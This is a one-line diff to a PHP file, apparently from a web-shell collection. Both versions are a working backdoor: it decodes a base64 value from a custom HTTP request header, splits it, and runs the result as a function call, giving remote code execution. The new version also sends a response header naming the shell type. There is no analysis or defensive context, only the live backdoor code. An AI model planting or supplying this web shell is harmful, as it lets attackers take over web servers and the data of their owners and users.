@@ -1,1 +1,1 @@
-<?php $x=explode('~',base64_decode($_SERVER['HTTP_AIZAWA_NINJA']));$x[0]($x[1]);
+<?php header('Aizawa-Type: http_aizawa_ninja_eval'); $x=explode('~',base64_decode($_SERVER['HTTP_AIZAWA_NINJA']));$x[0]($x[1]);
